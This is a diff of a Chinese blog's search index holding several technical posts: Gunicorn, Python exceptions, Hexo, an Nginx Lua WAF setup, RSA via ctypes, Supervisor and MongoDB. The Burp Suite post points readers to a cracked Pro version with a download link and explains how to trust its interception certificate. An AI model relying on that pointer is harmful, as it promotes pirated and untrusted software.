+    <content type="text"><![CDATA[FlaskFlask 虽然自带 Web 服务器，但是该服务器性能较低，是单进程单线程模型，原本是供开发测试使用。所以我们在生产环境中需要使用 Gunicorn 这样高性能服务器部署Flask服务。 GunicornGunicorn ‘Green Unicorn’ 是一个 UNIX 下的 WSGI HTTP 服务器，它是一个移植自 Ruby 的 Unicorn 项目的 pre-fork worker 模型。它既支持 eventlet，也支持 greenlet。在 Gunicorn 上运行 Flask 应用非常简单: gunicorn myproject:app Gunicorn 提供许多命令行参数，可以使用 gunicorn -h 来获得帮助。下面的例子 使用 4 worker 进程（ -w 4 ）来运行 Flask 应用，绑定到 localhost 的 4000 端口（ -b 127.0.0.1:4000 ）: gunicorn -w 4 -b 127.0.0.1:4000 myproject:app 几点注意的地方1.Gunicorn 日志分为 accesslog 和 errorlog，但是如果你没有配置这两个选项，它们不会被打印出来。 2.被 Gunicorn 包裹的web服务日志，可以改写输出到 Gunicorn errorlog 上，记得设置 errorlog 的 loglevel ，要不然你可能看不到日志。 3.如果 Gunicorn 开启了多进程，原来服务的日志系统也需要兼容多进程，或者仅输出到 Gunicorn 的 errorlog 上，写法如： app.logger.setLevel(logging.INFO)app.logger.handlers.extend(logging.getLogger("gunicorn.error").handlers) 我猜测这样是多进程安全的，仅仅是猜测! 4.如果你的服务在启动和结束之前还要执行其他操作，目前我不知道Gunicorn如何实现，官方给了自定义Gunicorn的写法，但是我遇到了无法结束的bug。参见：http://docs.gunicorn.org/en/stable/custom.html gunicorn server-hooks 提供这样的功能, 只需要在配置文件中添加对应的函数: import osimport syssys.path.append(os.path.abspath(os.path.dirname(__file__)))from spectre import cronsbind = ':5000'loglevel = 'info'access_log_format = '%(h)s %(l)s %(u)s "%(r)s" %(s)s %(b)s "%(f)s" "%(a)s"'accesslog = "/dev/null"errorlog = "/dev/null"def on_starting(server): # gunicorn 主进程启动之前的操作 crons.start()def on_exit(server): # gunicorn 退出之后的操作 crons.stop() 还有其他的钩子函数，参考：http://docs.gunicorn.org/en/latest/settings.html#server-hooks 后记原来喜欢用 python 不喜欢 php 写 web 最大的原因之一就是 php 必须假设在一个web服务器上，配置麻烦。现在发现python web框架自带的服务器就是个玩具而已，生产配置是一样的麻烦。 我还是太年轻了。也许可以花时间学下php，在适合的场景用适合的语言。]]></content>
+      <categories>
+        <category>开发</category>
+        <category>Flask</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+        <tag>Gunicorn</tag>
+        <tag>Flask</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Burpsuite初探]]></title>
+    <url>%2F2016%2F08%2F05%2Fburpsuite-install%2F</url>
+    <content type="text"><![CDATA[简介Burp Suite是响当当的web应用程序渗透测试集成平台。从应用程序攻击表面的最初映射和分析，到寻找和利用安全漏洞等过程，所有工具为支持整体测试程序而无缝地在一起工作。 安装版本：Burp suite pro v1.6.34（破解版本）下载地址：http://download.csdn.net/download/luckchoudog/9451559安装JDK: 百度下载 官方下载 启动解压Burp suite pro v1.6.34.rar，执行BurpLoader.jar即可。 HTTPS代理抓包设置1.访问代理服务器WEB界面http://127.0.0.1:8080，如果访问不了，更改为下图设置中的地址： 2.下载证书 3.双击文件安装到 受信任的根证书颁发机构 4.导出为cer格式证书 5.安装cer证书到 受信任的根证书颁发机构 同步骤3 HTTPS代理抓包设置（Chrome in Linux）如果是在Linux下，打开Chrome-Setting-HTTPS/SSL-Manage certificates..., 选择Authorities这一栏，导入证书文件即可。 HTTPS代理抓包效果 如果代理失败，可能是Burpsuite版本太低，ssl默认为RC4算法，百度https不支持。 Burpsuite的功能非常强大，以后慢慢学习。]]></content>
+      <categories>
+        <category>安全</category>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>Burpsuite</tag>
+        <tag>Web安全</tag>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Python中try/except/else/finally的执行机制]]></title>
+    <url>%2F2016%2F07%2F26%2Ftry-except-else-finally-in-Python%2F</url>
+    <content type="text"><![CDATA[最近经常使用到try/except/else/finally全部子句，对于执行顺序不是很熟悉，这里作一下记录。 不含return的情况一般情况try: print 'try'except: print 'except'else: print 'else'finally: print 'finally' output:tryelsefinally try子句异常try: print 'try'/0except: print 'except'else: print 'else'finally: print 'finally' output:exceptfinally try/except子句同时异常try: print 'try'/0except: print 'except'/0else: print 'else'finally: print 'finally' output: finallyTraceback (most recent call last): File "E:\tmp\test.py", line 4, in &lt;module&gt; print 'except'/0TypeError: unsupported operand type(s) for /: 'str' and 'int' else子句异常try: print 'try'except: print 'except'else: print 'else'/0finally: print 'finally' output: tryfinallyTraceback (most recent call last): File &quot;E:\tmp\test.py&quot;, line 12, in &lt;module&gt; t() File &quot;E:\tmp\test.py&quot;, line 7, in t print &apos;else&apos;/0TypeError: unsupported operand type(s) for /: &apos;str&apos; and &apos;int&apos; finally子句异常try: print 'try'except: print 'except'else: print 'else'finally: print 'finally'/0 output:tryelseTraceback (most recent call last): File "E:\tmp\test.py", line 11, in &lt;module&gt; t() File "E:\tmp\test.py", line 9, in t print 'finally'/0TypeError: unsupported operand type(s) for /: 'str' and 'int' 总结 finally子句总会执行 除了try子句，其他子句中的异常都会抛出 包含return的情况众所周知，return会直接跳出函数，那么它和异常机制的优先级如何呢？ try子句returndef t(): try: print 'try' return except: print 'except' else: print 'else' finally: print 'finally't() output: tryfinally else子句没有执行！finally子句仍然执行！ finally子句returndef t(): try: print 'try'/0 return 0 except: print 'except'/0 return 1 else: print 'else' return 2 finally: print 'finally' return 3print t() output: finally3 函数的返回值是3，而不是try子句中设置的0，而且except子句的异常不见了。但是如果注释掉finally子句的return，就可以看见except中抛出的异常。 def t(): try: print 'try'/0 return 0 except: print 'except'/0 return 1 else: print 'else' return 2 finally: print 'finally' # return 3print t() output: finallyTraceback (most recent call last): File "E:\tmp\test.py", line 15, in &lt;module&gt; print t() File "E:\tmp\test.py", line 6, in t print 'except'/0TypeError: unsupported operand type(s) for /: 'str' and 'int' 这是为什么呢？其实官方文档里有讲： A finally clause is always executed before leaving the try statement, whether an exception has occurred or not. When an exception has occurred in the try clause and has not been handled by an except clause (or it has occurred in a except or else clause), it is re-raised after the finally clause has been executed. The finally clause is also executed “on the way out” when any other clause of the try statement is left via a break, continue or return statement. 也就是说except、esle子句中的异常在finally子句执行之后才会抛出，但是finally直接return了，所以我们就看不到异常了，而且会覆盖本身的return值。这种用法显然是不符合初衷的，所以不建议在finally语句中使用return、break、continue这些跳出的语句，应仅用作资源释放操作，否则会出现意想不到的结果。 总结 执行顺序 finally &gt; return &gt; else finally的return会抑制其他子句异常抛出，不建议使用 一个例子def example(id): db = get_db() try: with db.cursor() as cursor: sql = '''update xxxx set yyyy = yyyy + 1 where id = %s''' cursor.execute(sql, (id,)) db.commit() except Exception, e: app.logger.error(e, exc_info=True) db.rollback() else: # do sth else return True finally: db.close() 注意return的位置和finally子句的用法。]]></content>
+      <categories>
+        <category>开发</category>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[支持select和input的JS组件]]></title>
+    <url>%2F2016%2F07%2F21%2F7-%E6%94%AF%E6%8C%81select%E5%92%8Cinput%E7%9A%84JS%E7%BB%84%E4%BB%B6%2F</url>
+    <content type="text"><![CDATA[其实一直以来都不喜欢写JS，但是工作中又不可避免的要写一些前台的用户交互，之前每次都是现写现查，以至于写了不少前端代码都没有积累。既然不能逃避，不如选择接受，从现在起开始有意识得积累一些前端经验。 JS作为一门语言，其设计品味不敢恭维，但是得益于多年在浏览器上的耕耘，无数前端工作者在其上面的工作令其大放异彩。从早期的JQuery到现在的AngularJS、ReactJS、NodeJS，JS自身的语义设计也随着ES6的发布变得越来越完善，也许JS未来会成为一门“真正”的好语言吧。 扯了那么多，现在进入正题。作为一个业余的JS开发者，自己开发组件显然不是一种好选择，在我碰到一个既可以让用户选择也能让用户自行输入的表单字段时陷入了困扰。在github上的搜索让我找到了select2.js这个组件，真的非常强大。 其中一个选项满足了我的业务： &lt;!-- 必要文件的包含 --&gt;&lt;script type="text/javascript" src="dist/js/select2.min.js"&gt;&lt;/script&gt;···&lt;!-- select 框 --&gt;&lt;select name="handler" class="form-control js-example-tags" multiple="multiple"&gt; &lt;option value="1"&gt;orange&lt;/option&gt; &lt;option value="2"&gt;purple&lt;/option&gt; &lt;option value="3"&gt;bule&lt;/option&gt;&lt;/select&gt;&lt;!-- 启用组件 --&gt;$(".js-example-tags").select2(&#123; tags: true&#125;) 效果： 更多用法：http://select2.github.io/examples.html#tags]]></content>
+      <categories>
+        <category>开发</category>
+        <category>JavaScript</category>
+      </categories>
+      <tags>
+        <tag>Javascript</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Hexo使用体验]]></title>
+    <url>%2F2016%2F07%2F01%2F6-Hexo%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C%2F</url>
+    <content type="text"><![CDATA[最早开始搭建个人博客的时候使用WordPress，光安装环境就折腾了许久，而且很多静态资源默认都是国外的，加载缓慢，替换起来也很麻烦。 于是后来就开始体验一些静态博客，从最知名的jekyll，到python开发的pelican，然后是go语言写的hugo，使用过程都不太满意，直到我遇见了Hexo &amp; Next。 Why Hexo其实我很早知道hexo，在github上面stars的数量也很高，但是年少的我对NodeJS带有偏见，以至于一路过来都没有尝试她。下面是我选择她的一些理由: 工具 文章生成速度 配置部署 主题 开发者 Jekyll/Pelican 慢 简单 多 外国人 Hugo 快 麻烦(go的很多代码被墙了) 较少 外国人 Hexo 快 简单 很多很好看（js毕竟是前端程序员的主力武器） 台湾 所以我放弃Pelican的理由是太慢了，放弃Hugo的理由是因为找不到我想要的主题，而且本地化支持不是很好。Hexo部署简单，性能也还不错，但是仅仅如此是不够。最重要的是因为Next。 Why NextNext是Github上面starts数最多的Hexo主题，最重要的是她是国人开发的，有着对本地化最完美的支持。 比如我们使用多说评论框，在Hugo上要去改写测试layouts文件，很容易出错，但是在Next里你只需要把你的duoshuoID配置在_config.yaml文件里就可以了。 此外她有丰富的国人编写的插件及简洁优美的外观，配合Nginx和国内JS、CSS的CDN，性能表现近乎完美。具体的介绍可以参考Next主页。 安装 HexoHexo是用Node开发的，所以我们需要先安装Node。 安装方式有： yum install nodejs nvm安装 官网 安装 推荐第一种，因为hexo对node没有特殊要求，采用最方便的方式安装即可。 node的包管理工具叫做npm，hexo就是用它安装，但是默认配置的npm是国外的，速度不稳定，所以建议修改为国内源: $ vim ~/.profile 添加 export NVM_NODEJS_ORG_MIRROR=https://npm.taobao.org/mirrors/node 到文件尾，然后执行source ~/.profile使配置生效。 然后安装hexo，一行搞定:$ npm install hexo-cli -g 部署Hexo设置你的博客$ hexo init blog$ cd blog 安装Next$ git clone https://github.com/iissnan/hexo-theme-next themes/next 启用主题，打开blog/_config.yaml， 找到 theme 字段，并将其值更改为 nexttheme: next 开启服务$ hexo server# 默认监听localhost:4000，可以通过-i参数指定ip(不能写0.0.0.0)# eg. hexo server -i `xxx.com` 这个时候访问localhost:4000就能看到博客默认的样子了，不过建议实际部署的时候不要用hexo直接作为web服务器，而用分发好的静态文件直接部署在nginx上比较好，因为Nginx作为服务器性能比Hexo强，资源占用少。hexo server只是在我们预览效果的时候使用。 其他命令： 创建文章 $ hexo new "Hello Hexo" 生成静态文件 $ hexo generate 分发静态文件 $ hexo deploy 静态文件还可以通过git直接部署在github上面，利用github搭建自己的静态博客。具体方法就不多说了。当然，本博客就是用Hexo &amp; Next搭建在Nginx之上 ^_^ 同步Hexo如果你只在一台电脑上写博客，你就不需要看这一部分。但是如果你有在多机上写博客的需求，那么解决Hexo同步的问题就很必要了。 Hexo的部署命令针对public里的静态文件，对于文章源文件和配置等没有同步功能，除非你每次写完博客都把源文件存储在一个公共的地方，要不然你没有办法接下来承接之前的文章继续写作。 我在网路上搜索了一下，一般有这么几个解决方法： 用DropBox同步源文件 把源文件存放在服务器上 使用hexo-git-backup 使用git保存源代码(建议) 我本身的源文件就是存放在服务器上，所以不方便使用云来存储代码，hexo-git-backup这个插件对于太新的node也不支持，所以我选择使用git保存源代码。 使用git不仅能够解决同步问题，也可以解决回滚问题，而且也是作者建议的方式——如果你发现了目录里的.gitignore——你应该也会这么认为。 备份假设你把网站搭建在github上面，那么master分支保存静态文件，可以新建hexo分支保存源文件。 首先把本地代码提交到远端，确保远端仓库不存在hexo分支或者hexo分支为空。$ cd blog# 新建本地仓库$ git init# 新建并切换到hexo分支$ git checkout -b hexo# 本地提交$ git add .$ git commit -m 'init'# 配置远端仓库地址$ git remote add git@github.com:xxxx/xxxx.github.io.git# 远端提交$ git push origin hexo 至此同步配置已经结束，之后每次修改或者新增文件我们需要在本地（确保在hexo分支）提交源文件至远端hexo分支，然后运行hexo g -d即可。 恢复如果重装了电脑或者换了电脑，安装git、node、npm、hexo之后，依次执行以下命令即可:# 配置新电脑的sshkey到github，否则选择https方式clone$ git clone git@github.com:xxxx/xxxx.github.io.git -b hexo blog$ cd blog# 安装hexo依赖，确保之前安装hexo模块时没有漏掉--save选项# eg. npm install hexo-deployer-git --save$ npm install 无须执行hexo init。 弊端因为github上面repo是公开的，而源文件中会有一些不宜公开的数据配置，所以更保险的做法是使用私人的代码仓库保存源代码，比如收费的github private，或者码云。]]></content>
+      <categories>
+        <category>博客</category>
+        <category>Hexo</category>
+      </categories>
+      <tags>
+        <tag>Hexo</tag>
+        <tag>Next</tag>
+        <tag>Blog</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Ngx_lua_waf搭建步骤]]></title>
+    <url>%2F2016%2F06%2F30%2F5-Ngx-lua-waf%E6%90%AD%E5%BB%BA%E6%AD%A5%E9%AA%A4%2F</url>
+    <content type="text"><![CDATA[Ngx_lua_waf是一个web防火墙，主要通过lua实现，安装简单，性能优异，由国人loveshell开发。 ngx_lua_waf是我刚入职趣游时候开发的一个基于ngx_lua的web应用防火墙。 代码很简单，开发初衷主要是使用简单，高性能和轻量级。 现在开源出来，遵从MIT许可协议。其中包含我们的过滤规则。如果大家有什么建议和想法，欢迎和我一起完善。 主页上介绍的安装流程不是很详细，我这里详细记录了一下。 安装openresty平台OpenResty 是一个基于 NGINX 和 LuaJIT 的 Web 平台,相当于集成了lua的Nginx，比自己编译安装Nginx+Lua要方便很多。步骤如下： # 切换至root用户su# 预装环境yum install readline-devel pcre-devel openssl-devel gcc# 下载安装包wget https://openresty.org/download/openresty-1.9.7.4.tar.gztar zxvf openresty-1.9.7.4.tar.gzcd openresty-1.9.7.4.tar.gz./configuremake &amp;&amp; make install 安装如果出现问题，可以参考 http://openresty.org/cn/installation.html 默认安装位置在/usr/local/openresty/nginx，修改conf/nginx.conf指定运行nginx worker的用户： user nginx;worker_processes 1;#error_log logs/error.log;#error_log logs/error.log notice;#error_log logs/error.log info;#pid logs/nginx.pid; 如果没有nginx用户，在root权限下运行useradd nginx即可添加。 如果是用systemctl管理服务，创建/lib/systemd/system/nginx.service文件，填写如下内容： [Unit]Description=nginxAfter=network.target[Service]Type=forkingExecStart=/usr/local/openresty/nginx/sbin/nginxExecReload=/usr/local/openresty/nginx/sbin/nginx -s reloadExecStop=/usr/local/openresty/nginx/sbin/nginx -s stopPrivateTmp=true[Install]WantedBy=multi-user.target 即可使用systemctl命令管理nginx服务： 启动 systemctl start nginx 关闭 systemctl stop nginx 重启 systemctl restart nginx 开启自启动 systemctl enable nginx 部署Ngx_lua_waf下载安装包到nginx配置目录，重命名为waf： cd /usr/local/openresty/nginx/confgit clone https://github.com/loveshell/ngx_lua_waf.git waf 然后修改Nginx.conf，在http下面增加以下waf配置： http &#123; include mime.types; default_type application/octet-stream; # Lua包的路径 lua_package_path "/usr/local/openresty/nginx/conf/waf/?.lua"; # Lua运行时最大内存 lua_shared_dict limit 10m; # Waf启动脚本 init_by_lua_file /usr/local/openresty/nginx/conf/waf/init.lua; # Waf过滤逻辑脚本 access_by_lua_file /usr/local/openresty/nginx/conf/waf/waf.lua; ··· 然后配置waf下的config.lua文件，主要是waf规则目录(RulePath)和日志目录(logdir): RulePath = "/usr/local/openresty/nginx/conf/waf/wafconf"--规则存放目录attacklog = "off"--是否开启攻击信息记录，需要配置logdirlogdir = "/usr/local/openresty/nginx/logs/hack/"--log存储目录，该目录需要用户自己新建，且需要nginx用户的可写权限UrlDeny="on"--是否拦截url访问Redirect="on"--是否拦截后重定向CookieMatch = "on"--是否拦截cookie攻击postMatch = "on" --是否拦截post攻击whiteModule = "on" --是否开启URL白名单black_fileExt=&#123;"php","jsp"&#125;--填写不允许上传文件后缀类型ipWhitelist=&#123;"127.0.0.1"&#125;--ip白名单，多个ip用逗号分隔ipBlocklist=&#123;"1.0.0.1"&#125;--ip黑名单，多个ip用逗号分隔CCDeny="on"--是否开启拦截cc攻击(需要nginx.conf的http段增加lua_shared_dict limit 10m;)CCrate = "100/60"--设置cc攻击频率，单位为秒.--默认1分钟同一个IP只能请求同一个地址100次html=[[Please go away~~]]--警告内容,可在中括号内自定义备注:不要乱动双引号，区分大小写 logdir目录尤其注意，需要用户自行创建，并且设置nginx用户可写，否则不会生成拦截日志也不会报错。 规则规则文件在wafconf下面，分为: args cookie post url user-agent whiteurl 文件一行一条规则，基于正则表达式编写，你可以根据你的需要进行修改。 效果在部署配置完成之后，执行命令systemctl restart nginx重启nginx服务，即可看到WAF效果： 拦截页面内容配置在config.lua的html字段中，你可以自定义更美观的样式。]]></content>
+      <categories>
+        <category>安全</category>
+        <category>WAF</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>Nginx</tag>
+        <tag>WAF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[python实现rsa的几种方案]]></title>
+    <url>%2F2015%2F12%2F09%2F4-python%E5%AE%9E%E7%8E%B0rsa%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%A1%88%2F</url>
+    <content type="text"><![CDATA[rsa这是一个纯python实现的库，不依赖底层文件，优点是部署容易，缺点是速度比较慢，原本是斯坦福大学教学演示用的，现在由Sybren A. Stüvel专人维护。 生产环境不太建议使用此库。 解密性能: 70ms左右 Python-RSA is a pure-Python RSA implementation. It supports encryption and decryption, signing and verifying signatures, and key generation according to PKCS#1 version 1.5. It can be used as a Python library as well as on the commandline. The code was mostly written by Sybren A. Stüvel. pycrypto这个库应用的比较多，不局限于rsa，实现了大多数常用的加密算法。底层应该也是自己实现的，因为相比后面一个调用系统模块的库它的rsa算法要慢很多。 解密性能: 40ms左右 This is a collection of both secure hash functions (such as SHA256 and RIPEMD160), and various encryption algorithms (AES, DES, RSA, ElGamal, etc.). The package is structured to make adding new modules easy. This section is essentially complete, and the software interface will almost certainly not change in an incompatible way in the future; all that remains to be done is to fix any bugs that show up. If you encounter a bug, please report it in the Launchpad bug tracker at… M2Crypto这个库是对Openssl库接口的python封装，实际运算都是调用系统的libssl.so/libcryto.so，不过安装的时候比较麻烦，需要依赖swig等工具 (demo)。 解密性能: 7ms左右 ctypes+openssl以上列举的几种方法都有一个问题，就是不能利用多核。当我调用解密接口比较集中的时候，接口耗时会成倍增加，即便是最快的M2Crypto，瞬时10个并发的时候最坏情况就会达到70ms左右。 因此我尝试直接使用ctypes调用openssl库突破的GIL的限制，不过ctypes调用so文件有点麻烦的就是看不到so提供的函数名，反复查阅openssl的文档和参考c代码之后，最终调试成功。结果也非常令人满意，达到了1ms级，瞬时100个并发也能维持在毫秒级的性能。 解密性能: 1ms左右 import ctypesfrom ctypes.util import find_library_libcrypto = find_library('crypto')sign = 'iYzF0bn6kwUtsqLmTSx8fx...'cryptor = ctypes.cdll.LoadLibrary(_libcrypto)RSA_size = cryptor.RSA_sizeBIO_free = cryptor.BIO_freeRSA_free = cryptor.RSA_freeRSA_decrypt = cryptor.RSA_private_decryptPEM_read_bio_RSAPrivateKey = cryptor.PEM_read_bio_RSAPrivateKeyprivkey = '''-----BEGIN RSA PRIVATE KEY-----...-----END RSA PRIVATE KEY-----''' bio = cryptor.BIO_new_mem_buf(privkey, -1)key = PEM_read_bio_RSAPrivateKey(bio, 0, 0, 0)r = BIO_free(bio)if r != 1: # break here print 'BIO_free error' returnrsa_size = RSA_size(key)rsa = ctypes.create_string_buffer(rsa_size)ret = RSA_decrypt(rsa_size, sign, rsa, key, 1) 其中privkey是私钥，sign是我要解密的数据。 总结 加解密这一块，Linux下面能用openssl就用openssl，绝对比自己实现快。 python+ctypes可以让你享受python便利的同时还能拥有卓越的性能，不过ctypes创建的内存空间记得要自己释放，python垃圾收集机制对其无效。 一般情况下推荐用pycrypto库，文档比较全面。]]></content>
+      <categories>
+        <category>安全</category>
+        <category>密码学</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+        <tag>RSA</tag>
+        <tag>密码学</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[利用supervisor部署多个tornado服务]]></title>
+    <url>%2F2015%2F12%2F09%2F3-%E5%88%A9%E7%94%A8supervisor%E9%83%A8%E7%BD%B2%E5%A4%9A%E4%B8%AAtornado%E6%9C%8D%E5%8A%A1%2F</url>
+    <content type="text"><![CDATA[单个Tornado服务由于文件句柄和处理请求数的限制不能够很好得满足实际的工作需求，因此我们搭建多个实例共同服务，但是Tornado自身没有这样的集群管理能力，所以我们需要借助第三方工具——Supervisor。Supervisor 是用Python编写的运行在Linux上的进程控制系统，用于监控和管理批量的服务进程，当前版本3.3.0。 安装$ pip install supervisor 配置$ echo_supervisord_conf &gt; /etc/supervisord.conf 修改默认配置编辑/etc/supervisord.conf： ; 修改unix socket文件位置，因为不清楚的原因，默认文件位置工作一段时间之后会不正常[unix_http_server]file=/home/libraco/conf/supervisor.sock ; (the path to the socket file)[supervisorctl]serverurl=unix:///home/libraco/conf/supervisor.sock ; use a unix:// URL for a unix socket; 取消注释，并修改配置文件目录[include]files = etc/supervisor/*.ini 配置Tornado在/etc/supervisor/下添加tornado.ini文件: [group:tornadoes]programs=tornado-8000,tornado-8001,tornado-8002,tornado-8003[program:tornado-8000];*命令路径,如果使用python启动的程序应该为 python /home/test.py, ;不建议放入/home/user/, 对于非user用户一般情况下是不能访问command=python /var/www/main.py --port=8000;执行目录,若有/home/supervisor_test/test1.py;将directory设置成/home/supervisor_test;则command只需设置成python test1.py;否则command必须设置成绝对执行目录directory=/var/www;*以www-data用户执行user=www-data;如果是true,当supervisor启动时,程序将会自动启动autostart=true;*自动重启autorestart=true;标准输出重定向到文件，标准错误重定向到标准输出stdout_logfile= /var/log/tornado-8000.logredirect_stderr=true[program:tornado-8001]command=python /var/www/main.py --port=8001directory=/var/wwwuser=www-dataautostart=trueautorestart=truestdout_logfile= /var/log/tornado-8001.logredirect_stderr=true[program:tornado-8002]command=python /var/www/main.py --port=8002directory=/var/wwwuser=www-dataautostart=trueautorestart=truestdout_logfile= /var/log/tornado-8002.logredirect_stderr=true[program:tornado-8003]command=python /var/www/main.py --port=8003directory=/var/wwwuser=www-dataautostart=trueautorestart=truestdout_logfile= /var/log/tornado-8003.logredirect_stderr=true 这里我们定义了一个名为tornadoes的组，包含四个成员tornado-8000、tornado-8001、tornado-8002、tornado-8003。 program定义进程名，每个program有单独的详细配置。 至此我们的配置工作基本完成。 启动$ /usr/bin/supervisord -c /etc/supervisord.conf 开机自启动$ sudo vim /lib/systemd/system/supervisor.service 写入如下内容:[Unit]Description=supervisorAfter=network.target[Service]Type=forkingExecStart=/usr/bin/supervisord -c /etc/supervisord.confPrivateTmp=true[Install]WantedBy=multi-user.target # 启动服务$ sudo systemctl start supervisor# 开机自启动$ sudo systemctl enable supervisor 管理服务管理服务需要用到supervisorctl命令，这个命令必须在Supervisord启动之后执行，它通过发送指令给Supervisord达到管理的目的。 常用的指令有： supervisorctl reload 重启Supervisord服务 supervisorctl restart &lt;name&gt;|&lt;gname&gt;重启某个服务或某一组服务 supervisorctl status查看服务运行的状态和时间 其他如果Tornado集群部署在Nginx反向代理之后，要获取到远程真实IP，除了必要的Nginx配置之外，Tornado也需要明确指定xheaders=True,官方有说明： If xheaders is True, we support the X-Real-Ip/X-Forwarded-For and X-Scheme/X-Forwarded-Proto headers, which override the remote IP and URI scheme/protocol for all requests. These headers are useful when running Tornado behind a reverse proxy or load balancer. The protocol argument can also be set to https if Tornado is run behind an SSL-decoding proxy that does not set one of the supported xheaders.具体代码示例： application = tornado.web.Application([ (r"/", MainHandler),])application.listen(options.port, '127.0.0.1', xheaders=True)]]></content>
+      <categories>
+        <category>运维</category>
+        <category>Supervisor</category>
+      </categories>
+      <tags>
+        <tag>Supervisor</tag>
+        <tag>Tornado</tag>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Centos使用Yum安装配置Mongodb]]></title>
+    <url>%2F2015%2F12%2F03%2F2-Centos%E4%BD%BF%E7%94%A8Yum%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AEMongodb%2F</url>
+    <content type="text"><![CDATA[安装Mongodb使用Yum，我们可以很方便的安装Mongodb: yum install mongodb mongodb-server yum会自动帮我们生成Mongodb的配置文件，其中最主要的配置文件/etc/mongod.conf部分内容如下： # Comma separated list of ip addresses to listen on (all local ips by default)bind_ip = 127.0.0.1# Specify port number (27017 by default)#port = 27017# Fork server process (false by default)fork = true# Full path to pidfile (if not set, no pidfile is created)pidfilepath = /var/run/mongodb/mongod.pid# Log file to send write to instead of stdout - has to be a file, not directorylogpath = /var/log/mongodb/mongod.log# Alternative directory for UNIX domain sockets (defaults to /tmp)unixSocketPrefix = /var/run/mongodb# Directory for datafiles (defaults to /data/db/)dbpath = /var/lib/mongodb# Enable/Disable journaling (journaling is on by default for 64 bit)#journal = true#nojournal = true 默认配置指定了IP、端口、数据文件、日志文件等等，十分详尽，可以根据自己的实际情况进行修改，一般用默认的就行了。 配置开机自启动打开/etc/rc.d/rc.local文件，追加/usr/bin/mongod –config /etc/mongod.conf至行尾，保存即可。 尝试启动service mongod start 结果失败了，提示我使用指令systemctl status mongodb查看原因，指令输出类似这样: mongodb.service - High-performance, schema-free document-oriented database Loaded: loaded (/usr/lib/systemd/system/mongodb.service; enabled) Active: failed (Result: exit-code) since Mi 2013-04-03 15:48:01 EEST; 3min 13s ago Process: 1756 ExecStart=/usr/bin/mongod --quiet --config /etc/mongodb.conf (code=exited, status=14)apr 03 15:48:01 echelon mongod[1756]: /usr/lib/libstdc++.so.6(_ZNSt6localeC1EPKc+0x71b) [0x7f60471c952b]apr 03 15:48:01 echelon mongod[1756]: /usr/lib/libboost_filesystem.so.1.53.0(_ZN5boost10filesystem4path7codecvtEv+0x4f) [0x7f6047adfb6f]apr 03 15:48:01 echelon mongod[1756]: /usr/lib/libboost_filesystem.so.1.53.0(_ZNK5boost10filesystem4path14root_directoryEv+0x114) [0x7f6047ae1344]apr 03 15:48:01 echelon mongod[1756]: /usr/lib/libboost_filesystem.so.1.53.0(_ZN5boost10filesystem8absoluteERKNS0_4pathES3_+0x3e) [0x7f6047add16e]apr 03 15:48:01 echelon mongod[1756]: /usr/bin/mongod(_ZN5mongo27initializeServerGlobalStateEb+0xf3) [0x94fc73]apr 03 15:48:01 echelon mongod[1756]: /usr/bin/mongod(main+0x234) [0x7591f4]apr 03 15:48:01 echelon mongod[1756]: /usr/lib/libc.so.6(__libc_start_main+0xf5) [0x7f60468b7a15]apr 03 15:48:01 echelon mongod[1756]: /usr/bin/mongod() [0x76bcd5]apr 03 15:48:01 echelon systemd[1]: mongodb.service: main process exited, code=exited, status=14/n/aapr 03 15:48:01 echelon systemd[1]: Unit mongodb.service entered failed state 仍然看不出哪里有问题，直到google到了这样的字眼sudo chown -R mongodb: /var/{lib,log}/mongodb，恍然大悟。 使用Yum安装Mongodb会默认创建mongo用户,该用户的家目录是/var/lib/mongodb, 但是日志文件/var/log/mongodb/mongod.log和进程ID文件/var/run/mongodb/mongod.pid在其他的目录下面，这些目录属主不是mongodb用户，所以写入的时候会报权限问题。 修改目录/var/log/mongodb和/var/run/mongodb属主为monodb即可。 总结Yum安装软件十分简单，但是由于Mongodb的安装包忽略了权限问题，而且出错日志十分不明显，导致我花费数十分钟才解决。 其实Linux下权限问题十分常见，发生问题不知道原因的时候都可以往这方面尝试一下。 更新后来想了一下，应该不是安装包的问题，这问题未免也太低级了。 极有可能是我安装好的时候使用自己的帐号运行过服务，所以产生的配置文件及目录的属主是我平常用的帐号，因此mongodb这个用户没有写入和执行权限。]]></content>
+      <categories>
+        <category>运维</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>Mongodb</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Nginx配置多域名反向代理]]></title>
+    <url>%2F2015%2F12%2F03%2F1-Nginx%E9%85%8D%E7%BD%AE%E5%A4%9A%E5%9F%9F%E5%90%8D%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%2F</url>
